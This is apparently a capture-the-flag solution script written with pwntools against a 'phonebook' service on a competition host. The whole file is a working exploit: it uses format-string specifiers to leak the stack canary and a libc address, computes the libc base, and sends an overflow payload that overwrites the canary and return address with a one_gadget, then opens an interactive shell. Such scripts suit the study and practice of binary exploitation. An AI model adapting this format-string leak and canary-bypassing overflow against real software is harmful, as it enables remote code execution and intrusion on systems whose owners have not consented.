from pwn import *
context.terminal = ["xterm", "-e"]
#r = gdb.debug("phonebook","""b show_entry""")
#r = process("phonebook")
r = remote("phonebook.nc.jctf.pro", 1337)

def add(name, num):
    r.sendlineafter('> ', '2')
    r.sendlineafter("Name:", name)
    r.sendlineafter("Number:", num)

def show(i):
    r.sendlineafter('> ', '1')
    r.sendlineafter("entry:", str(i))
    name = r.readline().strip().split(": ")[1]
    num = r.readline().strip().split(": ")[1]
    return name, num 

add("%9$lx", "%191$lx")
cookie, libc_start_main = show(0)
libc_start_main = int(libc_start_main, 16) - 0xea # we leak some random offset in
cookie = int(cookie, 16)
print hex(cookie), hex(libc_start_main)

#libc = ELF('/usr/lib/libc.so.6')
libc = ELF('Downloads/libc.so')


libc_base = libc_start_main - libc.symbols['__libc_start_main']
print hex(libc_base)

one_gadget = libc_base + 0x436fe

add("A"*127, "A"*1132 + p64(cookie) + "B"*8 + p64(one_gadget))
r.sendlineafter('> ', '4')
r.interactive()
